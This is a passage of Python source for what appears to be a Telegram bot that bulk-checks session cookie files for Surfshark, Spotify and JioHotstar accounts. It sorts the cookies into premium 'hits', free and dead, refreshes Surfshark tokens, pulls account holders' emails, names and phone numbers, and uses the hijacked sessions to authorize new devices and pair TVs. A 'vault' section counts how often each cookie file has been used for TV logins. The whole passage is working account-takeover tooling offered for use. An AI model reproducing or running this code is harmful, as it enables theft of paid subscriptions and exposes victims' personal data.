    fresh_sstk  = revived_tokens["sstk"]
    fresh_ssrtk = revived_tokens.get("ssrtk", ssrtk)

    api_info = ss_get_account_info(fresh_sstk)
    if not api_info:
        return {"status": "DEAD", "reason": "Fresh token rejected by API", "filename": filename, "content": content}

    email    = api_info.get("user", {}).get("email", "Unknown")
    is_premium, sub_info = ss_get_subscription_info(fresh_sstk)

    plan       = sub_info.get("plan", "Unknown")
    status_raw = sub_info.get("status", "Unknown")
    expires_at = sub_info.get("expires_at", "Unknown")
    if "T" in expires_at:
        expires_at = expires_at.split("T")[0]
    d_left = ss_calc_days_left(expires_at)

    raw_sub  = api_info.get("sub", {})
    parsed   = ss_parse_sub(raw_sub) if raw_sub else {}

    return {
        "status":     "PREMIUM" if is_premium else "FREE",
        "email":      email,
        "plan":       plan,
        "status_raw": status_raw,
        "expires_at": expires_at,
        "days_left":  d_left,
        "price":      parsed.get("price", "Unknown"),
        "region":     parsed.get("region", "Unknown"),
        "country":    parsed.get("country", "Unknown"),
        "filename":   filename,
        "content":    content,
        "sstk":       fresh_sstk,
        "ssrtk":      fresh_ssrtk,
        "revived":    True,
    }


def ss_check_file(filepath: str) -> Dict:
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
        return ss_check_one(content, os.path.basename(filepath))
    except Exception as e:
        return {"status": "DEAD", "reason": f"Read error: {str(e)[:40]}",
                "filename": os.path.basename(filepath), "content": ""}


def ss_authorize_device(cookie_content: str, sstk: str, code: str) -> tuple:
    """
    Authorize a device with the 6-digit code.
    FIX: Uses the FRESH revived _sstk (overrides stale one in raw cookie file).
    Endpoint auths via cookies only — no Authorization header.
    """
    # Parse raw cookies from file content
    cookies = {}
    for line in cookie_content.split("\n"):
        raw = line.rstrip("\r\n")
        if not raw:
            continue
        # Handle #HttpOnly_ prefix
        if raw.startswith("#HttpOnly_"):
            raw = raw[len("#HttpOnly_"):]
        elif raw.startswith("#"):
            continue
        if "\t" in raw:
            parts = raw.split("\t")
            if len(parts) >= 7:
                cookies[parts[5]] = parts[6]
        elif "=" in raw:
            k, _, v = raw.partition("=")
            k = k.strip()
            if k:
                cookies[k] = v.strip()

    # FIX: Override _sstk with the fresh revived token
    if sstk:
        cookies["_sstk"] = sstk

    # Build cookie string
    cookie_string = "; ".join(f"{k}={v}" for k, v in cookies.items() if k and v)

    try:
        resp = requests.post(
            "https://my.surfshark.com/account/p_api/v1/account/authorization/assign",
            json={"code": code.upper().strip()},
            headers={
                "Content-Type":     "application/json;charset=utf-8",
                "Accept":           "application/json",
                "User-Agent":       SS_UA_LOGIN,
                "Cookie":           cookie_string,
                "X-Requested-With": "XMLHttpRequest",
                "Origin":           "https://my.surfshark.com",
                "Referer":          "https://my.surfshark.com/account/login-code",
                # No Authorization header — endpoint uses cookies only
            },
            timeout=15,
        )
        if resp.status_code in (200, 201, 204):
            return True, ""
        try:
            body = resp.json()
            err  = body.get("message") or body.get("error") or body.get("detail") or str(body)
        except Exception:
            err = resp.text[:120] if resp.text else "no body"
        return False, f"HTTP {resp.status_code} — {err}"
    except requests.exceptions.Timeout:
        return False, "Request timed out"
    except Exception as e:
        return False, str(e)[:120]

def ss_fmt_premium(r: dict) -> str:
    rev_tag = f"  {SS_REVIVED} <i>Auto-Revived</i>" if r.get("revived") else ""
    return (
        f"╔═══════════════════════════╗\n"
        f"║  {SS_PREMIUM} <b>SS PREMIUM HIT!</b>{rev_tag}\n"
        f"╚═══════════════════════════╝\n\n"
        f"{E_EMAIL}  <b>Email   :</b> <code>{r.get('email','Unknown')}</code>\n"
        f"{E_PLAN}  <b>Plan    :</b> <code>{r.get('plan','Unknown')}</code>\n"
        f"{E_DATE}  <b>Expiry  :</b> <code>{r.get('expires_at','Unknown')}</code>\n"
        f"{E_CLOCK}  <b>Days    :</b> <code>{r.get('days_left','?')} days left</code>\n"
        f"{SS_PRICE}  <b>Price   :</b> <code>{r.get('price','Unknown')}</code>\n"
        f"{E_COUNTRY}  <b>Country :</b> <code>{r.get('country','Unknown')}</code>\n"
        f"{E_FILE}  <b>File    :</b> <code>{r.get('filename','?')}</code>"
    )


def ss_fmt_free(r: dict) -> str:
    return (
        f"╔═══════════════════════════╗\n"
        f"║  {SS_FREE} <b>SS FREE / EXPIRED</b>      ║\n"
        f"╚═══════════════════════════╝\n\n"
        f"{E_EMAIL}  <b>Email   :</b> <code>{r.get('email','Unknown')}</code>\n"
        f"{E_PLAN}  <b>Plan    :</b> <code>{r.get('plan','Unknown')}</code>\n"
        f"{E_DATE}  <b>Expiry  :</b> <code>{r.get('expires_at','Unknown')}</code>\n"
        f"{E_FILE}  <b>File    :</b> <code>{r.get('filename','?')}</code>\n\n"
        f"<i>Subscription expired or canceled.</i>"
    )


def ss_fmt_dead(r: dict) -> str:
    return (
        f"╔═══════════════════════════╗\n"
        f"║  {SS_DEAD} <b>SS DEAD COOKIE</b>         ║\n"
        f"╚═══════════════════════════╝\n\n"
        f"{E_FILE}  <b>File    :</b> <code>{r.get('filename','?')}</code>\n"
        f"{SS_DEAD}  <b>Reason  :</b> <code>{r.get('reason','Unknown error')}</code>"
    )


def ss_fmt_single(r: dict) -> str:
    s = r.get("status")
    if s == "PREMIUM": return ss_fmt_premium(r)
    if s == "FREE":    return ss_fmt_free(r)
    return ss_fmt_dead(r)


def ss_fmt_progress(processed, total, premium, free, dead, revived):
    pct = int(processed / total * 100) if total else 0
    bar = _pbar(processed, total)
    return (
        f"{E_GEAR} <b>Surfshark Checker</b> — Running\n\n"
        f"<code>[{bar}] {pct}%</code>\n"
        f"<b>{processed}</b> / <b>{total}</b> checked\n\n"
        f"{SS_PREMIUM} Premium  : <b>{premium}</b>\n"
        f"{SS_FREE} Free     : <b>{free}</b>\n"
        f"{SS_DEAD} Dead     : <b>{dead}</b>\n"
        f"{SS_REVIVED} Revived  : <b>{revived}</b>"
    )


def ss_fmt_summary(total, premium, free, dead, revived):
    pct = f"{premium / total * 100:.1f}" if total else "0.0"
    return (
        f"{E_CHECK} <b>Surfshark Check Complete!</b>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{E_COUNT} Total    : <b>{total}</b>\n"
        f"{SS_PREMIUM} Premium  : <b>{premium}</b>  (<i>{pct}% hit rate</i>)\n"
        f"{SS_FREE} Free     : <b>{free}</b>\n"
        f"{SS_DEAD} Dead     : <b>{dead}</b>\n"
        f"{SS_REVIVED} Revived  : <b>{revived}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{E_ZIP} Click <b>Get Results ZIP</b> to download all cookies."
    )


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║              SPOTIFY CHECKER                                            ║
# ╚══════════════════════════════════════════════════════════════════════════╝

SP_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
         "(KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36")
SP_UA_MOBILE = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36")


def sp_parse_cookies(content: str) -> dict:
    cookies = {}
    try:
        data = json.loads(content)
        if isinstance(data, list):
            for item in data:
                if isinstance(item, dict) and "name" in item and "value" in item:
                    cookies[item["name"]] = item["value"]
            return cookies
        if isinstance(data, dict):
            return data
    except Exception:
        pass
    for line in content.split("\n"):
        line  = line.strip()
        if not line:
            continue
        clean = line[10:] if line.startswith("#HttpOnly_") else line
        if clean.startswith("#"):
            continue
        if "\t" in clean:
            parts = clean.split("\t")
            if len(parts) >= 7:
                cookies[parts[5]] = parts[6].strip()
        elif "=" in clean:
            k, _, v = clean.partition("=")
            k = k.strip()
            if k and " " not in k:
                cookies[k] = v.strip()
    return cookies


def sp_get_account_info(cookies: dict) -> Optional[Dict]:
    try:
        resp = requests.get(
            "https://www.spotify.com/eg-ar/account/subscription/manage/",
            headers={
                "User-Agent":      SP_UA,
                "Accept":          "text/html,application/xhtml+xml,*/*;q=0.9",
                "Accept-Language": "en-US,en;q=0.9",
                "Cache-Control":   "no-cache",
            },
            cookies=cookies, allow_redirects=True, timeout=REQUEST_TIMEOUT,
        )
        if resp.status_code != 200:
            return None
        html    = resp.text
        page_ok = (
            "Don't have an account" in html
            or "إدارة اشتراكك" in html
            or '"planNameLong"' in html
            or "subscription" in html.lower()
        )
        if not page_ok:
            return None
        m    = re.search(r'"planNameLong":"([^"]*?)"', html)
        plan = m.group(1) if m else ("Spotify Free" if "Spotify Free" in html else "Unknown Plan")
        m     = re.search(r'"email":"([^"]+)"', html)
        email = m.group(1) if m else "Unknown"
        m       = re.search(r'"country":"([^"]+)"', html)
        country = m.group(1) if m else "Unknown"
        is_premium = any(k in plan for k in ("Premium", "باقة", "Family", "Duo", "Student"))
        return {"plan": plan, "email": email, "country": country, "is_premium": is_premium}
    except Exception:
        return None


def sp_check_one(content: str, filename: str = "") -> Dict:
    cookies = sp_parse_cookies(content)
    if not cookies:
        return {"status": "DEAD", "reason": "No cookies parsed", "filename": filename, "content": content}
    if "sp_dc" not in cookies:
        return {"status": "DEAD", "reason": "Missing sp_dc cookie", "filename": filename, "content": content}
    info = sp_get_account_info(cookies)
    if not info:
        return {"status": "DEAD", "reason": "Account check failed / cookie expired", "filename": filename, "content": content}
    return {
        "status":   "PREMIUM" if info["is_premium"] else "FREE",
        "plan":     info["plan"],
        "email":    info["email"],
        "country":  info["country"],
        "filename": filename,
        "content":  content,
        "cookies":  cookies,
    }


def sp_check_file(filepath: str) -> Dict:
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
        return sp_check_one(content, os.path.basename(filepath))
    except Exception as e:
        return {"status": "DEAD", "reason": f"Read error: {str(e)[:40]}",
                "filename": os.path.basename(filepath), "content": ""}


def sp_get_csrf_and_flow(cookies: dict) -> tuple:
    try:
        session  = requests.Session()
        session.cookies.update(cookies)
        flow_ctx = f"{uuid.uuid4()}%3A{int(time.time())}"
        resp = session.get(
            f"https://accounts.spotify.com/en/link/v2?flow_ctx={flow_ctx}",
            headers={
                "User-Agent":      SP_UA_MOBILE,
                "Accept":          "text/html,application/xhtml+xml,*/*;q=0.9",
                "Accept-Language": "en-US,en;q=0.9,ar;q=0.8",
                "Referer":         "https://www.spotify.com/",
            },
            allow_redirects=True, timeout=REQUEST_TIMEOUT,
        )
        if resp.status_code != 200:
            return None, None, None
        html = resp.text
        m    = re.search(r'initialToken":"([^"]+)"', html)
        csrf = m.group(1) if m else None
        m = re.search(r"flow_ctx=([^\"'\s&]+)", html)
        if m:
            flow_ctx = m.group(1)
        updated = cookies.copy()
        for c in session.cookies:
            updated[c.name] = c.value
        return csrf, flow_ctx, updated
    except Exception:
        return None, None, None


def sp_activate_tv(cookies: dict, code: str, csrf: str, flow: str) -> tuple:
    headers = {
        "Accept":          "*/*",
        "Accept-Language": "en-US,en;q=0.9,ar;q=0.8",
        "Content-Type":    "application/json",
        "Origin":          "https://accounts.spotify.com",
        "Referer":         f"https://accounts.spotify.com/en/link/v2?flow_ctx={flow}",
        "User-Agent":      SP_UA_MOBILE,
    }
    if csrf:
        headers["x-csrf-token"] = csrf
    try:
        r1 = requests.post(
            f"https://accounts.spotify.com/pair/api/code?flow_ctx={flow}",
            headers=headers, cookies=cookies, json={"code": code.upper()},
            timeout=REQUEST_TIMEOUT,
        )
        if r1.status_code != 200:
            return False, None, f"HTTP {r1.status_code} on code submit"
        data1 = r1.json()
        if data1.get("result") == "invalid":
            return False, None, "Invalid TV code — get a fresh one from your TV"
        if data1.get("result") != "ok":
            return False, None, f"Unexpected result: {data1.get('result', 'unknown')}"
        tv_name = (data1.get("codeInfo", {}).get("authorizationInfo", {})
                        .get("clientInfo", {}).get("name", "Unknown Device"))
        r2 = requests.post(
            f"https://accounts.spotify.com/pair/api/resolve?flow_ctx={flow}",
            headers=headers, cookies=cookies, json={"code": code.upper()},
            timeout=REQUEST_TIMEOUT,
        )
        if r2.status_code != 200:
            return False, tv_name, f"HTTP {r2.status_code} on resolve"
        result = r2.json().get("result", "")
        if result in ("ok", "success"):
            return True, tv_name, ""
        return False, tv_name, f"Resolve returned: {result}"
    except Exception as e:
        return False, None, str(e)[:120]


DIV_SP = "═" * 27


def sp_fmt_premium(r: dict) -> str:
    return (
        f"{SP_MUSIC} <b>{DIV_SP}</b>\n"
        f"        {SP_PREMIUM}  <b>SPOTIFY PREMIUM HIT</b>\n"
        f"{SP_MUSIC} <b>{DIV_SP}</b>\n\n"
        f"{E_PLAN}   <b>Plan    :</b>  <code>{r.get('plan','Unknown')}</code>\n"
        f"{E_EMAIL}   <b>Email   :</b>  <code>{r.get('email','Unknown')}</code>\n"
        f"{E_COUNTRY}   <b>Country :</b>  <code>{r.get('country','Unknown')}</code>"
    )


def sp_fmt_free(r: dict) -> str:
    return (
        f"{SP_MUSIC}  <b>SPOTIFY FREE ACCOUNT</b>\n"
        f"──────────────────────────────\n\n"
        f"{SP_FREE}   <b>Status  :</b>  <code>Free Plan</code>\n"
        f"{E_EMAIL}   <b>Email   :</b>  <code>{r.get('email','Unknown')}</code>\n"
        f"{E_COUNTRY}   <b>Country :</b>  <code>{r.get('country','Unknown')}</code>\n"
        f"{E_PLAN}   <b>Plan    :</b>  <code>{r.get('plan','Spotify Free')}</code>"
    )


def sp_fmt_dead(r: dict) -> str:
    return (
        f"{SP_DEAD}  <b>DEAD</b>\n"
        f"──────────────────────────────\n"
        f"<i>{r.get('reason','Cookie invalid or expired')}</i>"
    )


def sp_fmt_progress(done: int, total: int, hits: int, free: int, dead: int) -> str:
    pct    = done / total if total else 0
    filled = int(pct * 10)
    bar    = "█" * filled + "░" * (10 - filled)
    return (
        f"{SP_BOLT}  <b>Spotify Bulk Check Running…</b>\n\n"
        f"<code>[{bar}]  {int(pct * 100)}%</code>\n\n"
        f"{SP_PREMIUM} <b>{hits}</b>   {SP_FREE} <b>{free}</b>   {SP_DEAD} <b>{dead}</b>\n"
        f"{E_FILE}  <b>{done}</b> / <b>{total}</b> checked"
    )


def sp_fmt_summary(hits: int, free: int, dead: int, total: int, elapsed: float) -> str:
    return (
        f"{SP_MUSIC} <b>{DIV_SP}</b>\n"
        f"        {SP_SPARK}  <b>SPOTIFY CHECK COMPLETE</b>\n"
        f"{SP_MUSIC} <b>{DIV_SP}</b>\n\n"
        f"{E_COUNT}   <b>Total   :</b>  <code>{total}</code>\n"
        f"{SP_PREMIUM}   <b>Premium :</b>  <code>{hits}</code>\n"
        f"{SP_FREE}   <b>Free    :</b>  <code>{free}</code>\n"
        f"{SP_DEAD}   <b>Dead    :</b>  <code>{dead}</code>\n\n"
        f"{E_CLOCK}   <b>Time    :</b>  <code>{elapsed:.1f}s</code>"
    )


def sp_fmt_tv_ready(email, plan, country) -> str:
    return (
        f"{SP_MUSIC} <b>{DIV_SP}</b>\n"
        f"      {SP_TV}  <b>TV ACTIVATION READY</b>\n"
        f"{SP_MUSIC} <b>{DIV_SP}</b>\n\n"
        f"{E_EMAIL}   <b>Account :</b>  <code>{email}</code>\n"
        f"{E_PLAN}   <b>Plan    :</b>  <code>{plan}</code>\n"
        f"{E_COUNTRY}   <b>Country :</b>  <code>{country}</code>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{HS_PHONE} On your TV:\n"
        f"<b>Settings → Log in → Get a code</b>\n\n"
        f"→ Type the <b>6-character code</b> below 👇"
    )


def sp_fmt_tv_success(tv_name, code, email, plan, country) -> str:
    return (
        f"{SP_MUSIC} <b>{DIV_SP}</b>\n"
        f"        {SP_SPARK}  <b>TV ACTIVATED!</b>\n"
        f"{SP_MUSIC} <b>{DIV_SP}</b>\n\n"
        f"{SP_TV}   <b>Device  :</b>  <code>{tv_name}</code>\n"
        f"{SP_CODE}   <b>Code    :</b>  <code>{code}</code>\n"
        f"{E_EMAIL}   <b>Account :</b>  <code>{email}</code>\n"
        f"{E_PLAN}   <b>Plan    :</b>  <code>{plan}</code>\n"
        f"{E_COUNTRY}   <b>Country :</b>  <code>{country}</code>\n\n"
        f"<i>Open Spotify on your TV — you're in! {E_CHECK}</i>"
    )


# ▼ CHUNK 2 END — PASTE CHUNK 3 BELOW THIS LINE ▼
# ╔══════════════════════════════════════════════════════════════════════════╗
# ║              JIOHOTSTAR CHECKER                                         ║
# ╚══════════════════════════════════════════════════════════════════════════╝

HS_PLAN_KEYWORDS = [
    ("JioFiber",       "JioFiber Plan"),
    ("JioHotstar",     "JioHotstar Premium"),
    ("JHSMobileLite",  "JHS Mobile Lite"),
    ("HotstarSuper",   "Hotstar Super"),
    ("HotstarBundle",  "Hotstar Bundle"),
    ("SingleDevice",   "Single Device"),
    ("HotstarPremium", "Hotstar Premium"),
    ("Mobile",         "Mobile Plan"),
]


def hs_decode_jwt(token):
    try:
        parts = token.split(".")
        if len(parts) >= 2:
            payload = parts[1]
            payload += "=" * (4 - len(payload) % 4)
            return json.loads(base64.b64decode(payload))
    except Exception:
        pass
    return None


def hs_parse_cookie_content(content):
    cookies = {}
    session_token = user_up_token = device_id = None
    try:
        data = json.loads(content)
        if isinstance(data, dict):
            for key, value in data.items():
                if key in ["sessionUserUP", "userUP", "deviceId",
                           "userCountryCode", "userHID", "userPID"]:
                    cookies[key] = value
                    if key == "sessionUserUP":
                        session_token = value
                    elif key == "userUP":
                        user_up_token = value
                    elif key == "deviceId":
                        device_id = value
            return cookies, session_token, user_up_token, device_id
    except Exception:
        pass
    for line in content.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split("\t")
        if len(parts) >= 7:
            name, value = parts[5], parts[6]
            cookies[name] = value
            if name == "sessionUserUP":
                session_token = value
            elif name == "userUP":
                user_up_token = value
            elif name == "deviceId":
                device_id = value
    if not cookies:
        for line in content.splitlines():
            line = line.strip()
            if "=" in line and not line.startswith("#"):
                key, value = line.split("=", 1)
                key, value = key.strip(), value.strip()
                cookies[key] = value
                if key == "sessionUserUP":
                    session_token = value
                elif key == "userUP":
                    user_up_token = value
                elif key == "deviceId":
                    device_id = value
    return cookies, session_token, user_up_token, device_id


def hs_detect_plan(jwt_plan: str) -> str:
    for keyword, label in HS_PLAN_KEYWORDS:
        if keyword.lower() in jwt_plan.lower():
            return label
    return jwt_plan if jwt_plan not in ("Unknown", "") else "Unknown Plan"


def hs_check_single(cookies, session_token, user_up_token, device_id, filename=""):
    token_to_use = session_token or user_up_token
    if not cookies and not token_to_use:
        return {"status": "INVALID", "reason": "No cookies found", "filename": filename}

    name = phone = "Unknown"
    jwt_plan = "Unknown"
    jwt_expiry = "Unknown"
    country_code = "Unknown"
    subscription_plan = ""
    subscription_expiry = ""
    subscription_exp_timestamp = 0

    if token_to_use:
        jwt_data = hs_decode_jwt(token_to_use)
        if jwt_data and "sub" in jwt_data:
            try:
                sub  = json.loads(jwt_data["sub"])
                name         = sub.get("name",        "Unknown")
                phone        = sub.get("phone",       "Unknown")
                country_code = sub.get("countryCode", "Unknown")
                subs = sub.get("subscriptions", {})
                if "in" in subs:
                    for plan_type, plan_details in subs["in"].items():
                        subscription_plan   = plan_type
                        subscription_expiry = plan_details.get("expiry", "")
                        if subscription_expiry:
                            try:
                                exp_str = subscription_expiry.split("T")[0]
                                exp_dt  = datetime.strptime(exp_str, "%Y-%m-%d")
                                subscription_exp_timestamp = int(exp_dt.timestamp())
                            except Exception:
                                subscription_exp_timestamp = 0
                        break
            except Exception:
                pass

    current_time = int(time.time())
    has_valid_subscription = (
        bool(subscription_plan)
        and subscription_exp_timestamp > 0
        and subscription_exp_timestamp > current_time
    )
    if has_valid_subscription:
        jwt_plan   = hs_detect_plan(subscription_plan)
        jwt_expiry = subscription_expiry.split("T")[0] if subscription_expiry else "Unknown"

    headers = {
        "accept":         "application/json, text/plain, */*",
        "x-hs-platform":  "web",
        "x-hs-app":       "260306000",
        "user-agent":     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "x-country-code": "in",
        "referer":        "https://www.hotstar.com/in/home",
    }
    if cookies:
        headers["cookie"] = "; ".join(f"{k}={v}" for k, v in cookies.items())
    if token_to_use:
        headers["x-hs-usertoken"] = token_to_use
    if device_id:
        headers["x-hs-device-id"] = device_id

    try:
        resp = requests.get(
            "https://www.hotstar.com/api/internal/bff/v2/slugs/in/settings",
            headers=headers, timeout=REQUEST_TIMEOUT,
        )
        if resp.status_code != 200:
            return {"status": "INVALID", "reason": f"HTTP {resp.status_code}", "filename": filename}
        text = resp.text
        if "ERR_UM_USER_LOGGED_OUT" in text:
            return {
                "status":   "DEVICE_LIMIT",
                "name":     name, "phone": phone,
                "plan":     jwt_plan, "expiry": jwt_expiry,
                "cookies":  cookies, "filename": filename,
            }
        if has_valid_subscription:
            days_left = max(0, (subscription_exp_timestamp - current_time) // 86400)
            show_ads  = "No" if '"showAds":"0"' in text or '"showAds": "0"' in text else "Yes"
            return {
                "status":    "LIVE",
                "name":      name, "phone":    phone,
                "plan":      jwt_plan, "expiry": jwt_expiry,
                "days_left": str(days_left), "show_ads": show_ads,
                "cookies":   cookies, "filename": filename,
            }
        return {
            "status":   "FREE",
            "name":     name, "phone":  phone,
            "plan":     jwt_plan, "expiry": jwt_expiry,
            "cookies":  cookies, "filename": filename,
        }
    except Exception as e:
        return {"status": "INVALID", "reason": str(e)[:60], "filename": filename}


def hs_check_file(filepath: str) -> Dict:
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
        cookies, session_token, user_up_token, device_id = hs_parse_cookie_content(content)
        filename = os.path.basename(filepath)
        if not cookies and not session_token:
            sm = re.search(r"sessionUserUP[:=]\s*([^\s;,\n\"']+)", content)
            um = re.search(r"userUP[:=]\s*([^\s;,\n\"']+)",        content)
            dm = re.search(r"deviceId[:=]\s*([^\s;,\n\"']+)",      content)
            if sm: session_token = sm.group(1)
            if um: user_up_token  = um.group(1)
            if dm: device_id      = dm.group(1)
        return hs_check_single(cookies, session_token, user_up_token, device_id, filename)
    except Exception as e:
        return {"status": "INVALID", "reason": f"Parse error: {str(e)[:30]}",
                "filename": os.path.basename(filepath)}


def hs_convert_to_netscape(cookies):
    lines = ["# Netscape HTTP Cookie File"]
    for name, value in (cookies or {}).items():
        lines.append(f".hotstar.com\tTRUE\t/\tFALSE\t1779686026\t{name}\t{value}")
    return "\n".join(lines)


def hs_plan_breakdown(results: list) -> dict:
    bd = defaultdict(list)
    for r in results:
        bd[r.get("plan", "Unknown Plan")].append(r)
    return dict(bd)


def _plan_lines(breakdown: dict, prefix: str = "") -> str:
    if not breakdown:
        return f"{prefix}<i>None</i>"
    return "\n".join(
        f"{prefix}{E_PLAN} <b>{plan}</b>  →  <b>{len(items)}</b>"
        for plan, items in sorted(breakdown.items(), key=lambda x: -len(x[1]))
    )


def hs_fmt_live(r: dict, hit_num: int = 0) -> str:
    num_tag = f"  <b>HIT #{hit_num:03d}</b>" if hit_num else ""
    return (
        f"╔═══════════════════════════╗\n"
        f"║  {HS_LIVE} <b>HOTSTAR LIVE!</b>{num_tag}\n"
        f"╚═══════════════════════════╝\n\n"
        f"{HS_USER}  <b>Name   :</b> <code>{r.get('name','Unknown')}</code>\n"
        f"{HS_PHONE}  <b>Phone  :</b> <code>{r.get('phone','Unknown')}</code>\n"
        f"{E_PLAN}  <b>Plan   :</b> <code>{r.get('plan','Unknown')}</code>\n"
        f"{E_DATE}  <b>Expiry :</b> <code>{r.get('expiry','Unknown')}</code>\n"
        f"{E_CLOCK}  <b>Days   :</b> <code>{r.get('days_left','?')} days left</code>\n"
        f"{HS_TV}  <b>Ads    :</b> <code>{r.get('show_ads','?')}</code>\n"
        f"{E_FILE}  <b>File   :</b> <code>{r.get('filename','?')}</code>"
    )


def hs_fmt_device(r: dict) -> str:
    return (
        f"╔═══════════════════════════╗\n"
        f"║  {HS_DEVICE} <b>DEVICE LIMIT</b>          ║\n"
        f"╚═══════════════════════════╝\n\n"
        f"{HS_USER}  <b>Name   :</b> <code>{r.get('name','Unknown')}</code>\n"
        f"{HS_PHONE}  <b>Phone  :</b> <code>{r.get('phone','Unknown')}</code>\n"
        f"{E_PLAN}  <b>Plan   :</b> <code>{r.get('plan','Unknown')}</code>\n"
        f"{E_DATE}  <b>Expiry :</b> <code>{r.get('expiry','Unknown')}</code>\n"
        f"{E_FILE}  <b>File   :</b> <code>{r.get('filename','?')}</code>"
    )


def hs_fmt_free(r: dict) -> str:
    return (
        f"╔═══════════════════════════╗\n"
        f"║  {HS_FREE} <b>HOTSTAR FREE</b>           ║\n"
        f"╚═══════════════════════════╝\n\n"
        f"{HS_USER}  <b>Name   :</b> <code>{r.get('name','Unknown')}</code>\n"
        f"{HS_PHONE}  <b>Phone  :</b> <code>{r.get('phone','Unknown')}</code>\n"
        f"{E_FILE}  <b>File   :</b> <code>{r.get('filename','?')}</code>\n\n"
        f"<i>No active subscription found.</i>"
    )


def hs_fmt_invalid(r: dict) -> str:
    return (
        f"╔═══════════════════════════╗\n"
        f"║  {HS_INVALID} <b>INVALID COOKIE</b>        ║\n"
        f"╚═══════════════════════════╝\n\n"
        f"{E_FILE}  <b>File   :</b> <code>{r.get('filename','?')}</code>\n"
        f"{HS_INVALID}  <b>Reason :</b> <code>{r.get('reason','Unknown error')}</code>"
    )


def hs_fmt_single(r: dict) -> str:
    s = r.get("status", "INVALID")
    if s == "LIVE":         return hs_fmt_live(r, 1)
    if s == "DEVICE_LIMIT": return hs_fmt_device(r)
    if s == "FREE":         return hs_fmt_free(r)
    return hs_fmt_invalid(r)


def hs_fmt_progress(processed, total, live, device, free, invalid, breakdown):
    pct      = int(processed / total * 100) if total else 0
    bar      = _pbar(processed, total)
    plan_sec = (
        f"\n\n{E_STATS} <b>Live — By Plan:</b>\n" + _plan_lines(breakdown, "  ")
        if breakdown else ""
    )
    return (
        f"{E_GEAR} <b>Hotstar Checker</b> — Running\n\n"
        f"<code>[{bar}] {pct}%</code>\n"
        f"<b>{processed}</b> / <b>{total}</b> checked\n\n"
        f"{HS_LIVE} Live          : <b>{live}</b>\n"
        f"{HS_DEVICE} Device Limit  : <b>{device}</b>\n"
        f"{HS_FREE} Free          : <b>{free}</b>\n"
        f"{HS_INVALID} Invalid       : <b>{invalid}</b>"
        f"{plan_sec}"
    )


def hs_fmt_summary(total, live, device, free, invalid, breakdown):
    pct       = f"{live / total * 100:.1f}" if total else "0.0"
    plan_text = _plan_lines(breakdown, "  ") if breakdown else "  <i>No live hits</i>"
    return (
        f"{E_CHECK} <b>Hotstar Check Complete!</b>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{E_COUNT} Total Checked  : <b>{total}</b>\n"
        f"{HS_LIVE} Live           : <b>{live}</b>  (<i>{pct}% hit rate</i>)\n"
        f"{HS_DEVICE} Device Limit   : <b>{device}</b>\n"
        f"{HS_FREE} Free           : <b>{free}</b>\n"
        f"{HS_INVALID} Invalid        : <b>{invalid}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{E_STATS} <b>Live — By Plan:</b>\n{plan_text}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{E_ZIP} Click <b>Get Results ZIP</b> to download all hits."
    )


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║              JIOHOTSTAR VAULT (QR TV LOGIN)                             ║
# ╚══════════════════════════════════════════════════════════════════════════╝

def hs_vault_load_usage() -> dict:
    try:
        with open(HS_VAULT_USAGE_FILE, "r") as f:
            return json.load(f)
    except Exception:
        return {}

def hs_vault_save_usage(usage: dict):
    with open(HS_VAULT_USAGE_FILE, "w") as f:
        json.dump(usage, f, indent=2)

def hs_vault_get_use_count(filename: str) -> int:
    return hs_vault_load_usage().get(filename, 0)

def hs_vault_increment_use(filename: str) -> int:
    usage = hs_vault_load_usage()
    usage[filename] = usage.get(filename, 0) + 1
    hs_vault_save_usage(usage)
    return usage[filename]

def hs_vault_load_stats() -> dict:
    try:
        with open(HS_VAULT_STATS_FILE, "r") as f:
            return json.load(f)
    except Exception:
        return {"total": 0, "success": 0, "failed": 0, "last": None}

def hs_vault_save_stats(stats: dict):
    with open(HS_VAULT_STATS_FILE, "w") as f:
        json.dump(stats, f, indent=2)

def hs_vault_record(success: bool):
    s = hs_vault_load_stats()
    s["total"]  += 1
    s["success" if success else "failed"] += 1
    s["last"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    hs_vault_save_stats(s)

def hs_vault_count() -> int:
    return len(glob.glob(os.path.join(HS_VAULT_DIR, "*.txt")))

def hs_vault_available_count() -> int:
    usage = hs_vault_load_usage()
    return sum(
        1 for fp in glob.glob(os.path.join(HS_VAULT_DIR, "*.txt"))
        if usage.get(os.path.basename(fp), 0) < HS_VAULT_MAX_USES
    )

def hs_vault_parse_cookie_file(filepath: str) -> dict:
    cookies = {}
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()

        for line in content.splitlines():
            line = line.strip()
            if not line:
                continue
            if line.startswith("#HttpOnly_"):
                line = line[len("#HttpOnly_"):]
            elif line.startswith("#"):
                continue
            parts = line.split("\t")
            if len(parts) >= 7:
                cookies[parts[5]] = parts[6]

        if not cookies.get("sessionUserUP"):
            text = content.strip()
            if text.startswith(("{", "[")):
                try:
                    obj = json.loads(text)
                    if isinstance(obj, dict):
                        cookies.update({k: str(v) for k, v in obj.items() if v})
                        if "cookies" in obj and isinstance(obj["cookies"], list):
                            for c in obj["cookies"]:
                                if isinstance(c, dict) and c.get("name") and c.get("value"):
                                    cookies[c["name"]] = str(c["value"])
                    elif isinstance(obj, list):
                        for c in obj:
                            if isinstance(c, dict) and c.get("name") and c.get("value"):
                                cookies[c["name"]] = str(c["value"])
                except Exception:
                    pass

